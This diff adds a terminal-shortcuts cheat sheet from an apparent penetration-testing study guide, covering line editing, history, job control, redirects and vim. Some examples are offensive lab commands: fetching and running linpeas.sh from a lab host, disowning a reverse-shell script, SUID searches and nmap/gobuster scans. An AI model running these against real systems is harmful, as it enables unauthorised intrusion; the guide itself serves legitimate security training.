@@ -1,0 +1,245 @@
+# Terminal Shortcuts
+
+> Speed in the terminal is a skill. The less time you spend typing and correcting, the more time you spend thinking. These shortcuts become muscle memory fast — and they matter most when you're under pressure.
+
+---
+
+## Why This Matters
+
+On an exam or a live engagement, you're working fast. A missed character in a command, a frozen process you can't exit, or a lost output because you didn't redirect — these cost time. Knowing your terminal shortcuts cold removes friction from every action you take.
+
+---
+
+## Auto-Complete
+
+| Shortcut  | Action                                       |
+| --------- | -------------------------------------------- |
+| `Tab`     | Auto-complete command, filename, or path     |
+| `Tab Tab` | Show all possible completions when ambiguous |
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Type partial command and hit Tab
+cat /etc/pa[TAB]     → /etc/passwd
+sys[TAB][TAB]        → systemctl  systemd  syslog ...
+```
+
+---
+
+## Cursor Movement
+
+Move around a long command without the arrow key — faster and more precise.
+
+| Shortcut   | Action                    |
+| ---------- | ------------------------- |
+| `Ctrl + A` | Jump to beginning of line |
+| `Ctrl + E` | Jump to end of line       |
+| `Ctrl + ←` | Jump one word left        |
+| `Ctrl + →` | Jump one word right       |
+| `Alt + B`  | Move backward one word    |
+| `Alt + F`  | Move forward one word     |
+
+---
+
+## Editing the Current Line
+
+| Shortcut   | Action                                             |
+| ---------- | -------------------------------------------------- |
+| `Ctrl + U` | Delete everything from cursor to beginning of line |
+| `Ctrl + K` | Delete everything from cursor to end of line       |
+| `Ctrl + W` | Delete the word before the cursor                  |
+| `Ctrl + Y` | Paste the last deleted text (yank)                 |
+| `Ctrl + _` | Undo last edit                                     |
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Typed a long command with a mistake at the start?
+# Ctrl+A to jump to beginning, then Ctrl+K to clear forward
+# Or Ctrl+U to wipe the whole thing and start over
+```
+
+---
+
+## Command History
+
+These save enormous time — stop retyping commands you've already run.
+
+| Shortcut    | Action                                        |
+| ----------- | --------------------------------------------- |
+| `↑` / `↓`   | Step through previous / next commands         |
+| `Ctrl + R`  | Reverse search through history                |
+| `Ctrl + G`  | Cancel history search, return to prompt       |
+| `!!`        | Repeat the last command                       |
+| `!<string>` | Run the last command starting with `<string>` |
+| `!$`        | Last argument of the previous command         |
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Ctrl+R — start typing to search backwards through history
+(reverse-i-search)`find': find / -perm -4000 2>/dev/null
+
+# !! — repeat last command (useful for adding sudo)
+apt install nmap
+sudo !!           # → sudo apt install nmap
+
+# !$ — reuse last argument
+cat /etc/passwd
+grep root !$      # → grep root /etc/passwd
+
+# Show full command history
+history
+history | grep "find\|ssh\|curl"    # Search history
+```
+
+---
+
+## Process Control
+
+| Shortcut   | Action                                             |
+| ---------- | -------------------------------------------------- |
+| `Ctrl + C` | Send SIGINT — interrupt / kill the current process |
+| `Ctrl + Z` | Send SIGTSTP — suspend process to background       |
+| `Ctrl + D` | Send EOF — close STDIN / exit current shell        |
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Running a scan that's taking too long?
+Ctrl+Z      # suspend it
+bg          # resume it in the background
+jobs        # see all background jobs
+fg 1        # bring job 1 back to foreground
+
+# Stuck in a program with no quit option?
+Ctrl+C      # interrupt it
+
+# Exit a shell or close a pipe
+Ctrl+D
+```
+
+---
+
+## Screen & Terminal
+
+| Shortcut    | Action                                      |
+| ----------- | ------------------------------------------- |
+| `Ctrl + L`  | Clear the terminal screen (same as `clear`) |
+| `Ctrl + +`  | Zoom in                                     |
+| `Ctrl + -`  | Zoom out                                    |
+| `Alt + Tab` | Switch between open applications            |
+
+---
+
+## Working With Multiple Commands
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Run commands sequentially regardless of success/failure
+cmd1 ; cmd2 ; cmd3
+
+# Run next command ONLY if previous succeeded (exit code 0)
+cmd1 && cmd2 && cmd3
+
+# Run next command ONLY if previous failed
+cmd1 || cmd2
+
+# Run in background, continue immediately
+./long_scan.sh &
+
+# Chain background jobs
+nmap -sC -sV 10.10.10.5 & ; gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt &
+```
+
+---
+
+## Useful Shell Tricks
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Run a command as root without switching user
+sudo !!
+
+# Quickly edit a long command in your default editor
+Ctrl+X Ctrl+E     # Opens current command in $EDITOR
+
+# Repeat a command every N seconds
+watch -n 2 "ss -tuln"         # Refresh listening ports every 2s
+watch -n 5 "ps aux | grep python"
+
+# Time a command
+time nmap -sC -sV 10.10.10.5
+
+# Run multiple commands in a subshell
+(cd /tmp && wget http://10.10.14.1/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh)
+
+# Disown a background process (keeps running after you close the terminal)
+./revshell.sh &
+disown
+```
+
+---
+
+## Redirects & Pipes Quick Reference
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+cmd > file          # STDOUT to file (overwrite)
+cmd >> file         # STDOUT to file (append)
+cmd 2>/dev/null     # Discard STDERR
+cmd 2>&1            # Redirect STDERR to STDOUT
+cmd &>/dev/null     # Discard ALL output
+cmd1 | cmd2         # Pipe STDOUT of cmd1 to cmd2
+cmd < file          # Feed file as STDIN to cmd
+cmd << EOF          # Here-document — inline STDIN until EOF
+```
+
+---
+
+## Vim Essentials
+
+You'll land on boxes where vim is the only editor available. Know enough to survive.
+
+| Command         | Action                    |
+| --------------- | ------------------------- |
+| `i`             | Enter insert mode         |
+| `Esc`           | Return to normal mode     |
+| `:w`            | Save file                 |
+| `:q`            | Quit                      |
+| `:wq`           | Save and quit             |
+| `:q!`           | Quit without saving       |
+| `dd`            | Delete current line       |
+| `yy`            | Copy current line         |
+| `p`             | Paste below cursor        |
+| `/pattern`      | Search forward            |
+| `n`             | Next search result        |
+| `:%s/old/new/g` | Find and replace all      |
+| `:set number`   | Show line numbers         |
+| `G`             | Jump to end of file       |
+| `gg`            | Jump to beginning of file |
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Open a file
+vim /etc/crontab
+
+# Quickly append a line to a file from vim
+# Press G (go to end), o (new line below), type your content, Esc, :wq
+```
+
+---
+
+## Complete Shortcuts Reference
+
+| Category          | Shortcut   | Action                   |
+| ----------------- | ---------- | ------------------------ |
+| **Auto-complete** | `Tab`      | Complete command or path |
+| **Cursor**        | `Ctrl+A`   | Beginning of line        |
+| **Cursor**        | `Ctrl+E`   | End of line              |
+| **Cursor**        | `Ctrl+←/→` | Jump word left/right     |
+| **Edit**          | `Ctrl+U`   | Delete to beginning      |
+| **Edit**          | `Ctrl+K`   | Delete to end            |
+| **Edit**          | `Ctrl+W`   | Delete previous word     |
+| **Edit**          | `Ctrl+Y`   | Paste deleted text       |
+| **History**       | `Ctrl+R`   | Search command history   |
+| **History**       | `↑/↓`      | Previous/next command    |
+| **History**       | `!!`       | Repeat last command      |
+| **History**       | `!$`       | Last argument            |
+| **Process**       | `Ctrl+C`   | Kill current process     |
+| **Process**       | `Ctrl+Z`   | Suspend to background    |
+| **Process**       | `Ctrl+D`   | Close STDIN / exit shell |
+| **Screen**        | `Ctrl+L`   | Clear terminal           |
+
+---
+
+_You've reached the end of the Linux chapter. Next stop: [Linux Privilege Escalation](/attacks/privilege-escalation/linux) — taking everything you've enumerated and turning it into root._
